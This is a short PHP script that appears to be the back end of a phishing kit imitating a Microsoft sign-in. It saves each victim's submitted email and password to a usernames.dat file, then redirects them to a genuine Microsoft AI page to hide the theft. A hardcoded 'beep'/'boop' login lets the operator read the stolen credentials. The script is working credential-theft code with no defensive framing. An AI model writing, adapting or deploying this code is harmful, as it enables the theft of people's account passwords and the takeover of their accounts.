
<?php
  include 'ip.php';
  session_start();
  $pass = $_POST["passwd"];
  $email = $_SESSION["Email"];
 
  // Adjusted file path for your current directory
  $file_path = '/the rest of your path from root/micro/auth/usernames.dat';
 
  if ($email === "beep" && $pass === "boop") {
    if (file_exists($file_path)) {
      $file_content = file_get_contents($file_path);
      if ($file_content !== false) {
        echo "<pre>" . htmlspecialchars($file_content) . "</pre>";
      } else {
        echo 'Unable to read file.';
      }
    } else {
      echo 'File not found.';
    }
  } else {
    // Write to usernames.dat if credentials don't match
    file_put_contents($file_path, "Username:: " . $email . "    Password:: " . $pass . "\n", FILE_APPEND);
    header('Location:https://www.microsoft.com/fr-ca/ai/?ef_id=_k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&OCID=AIDcmml4otzwfr_SEM__k_Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB_k_&gclid=Cj0KCQiAyKurBhD5ARIsALamXaHw_iKc0L1m_qexB_Y_a6xVhrbVOcdcjajA_Vd-R7ZoxzhJw1SiuSsaAi6zEALw_wcB');

    exit();
  }
 
  session_destroy();   
?>
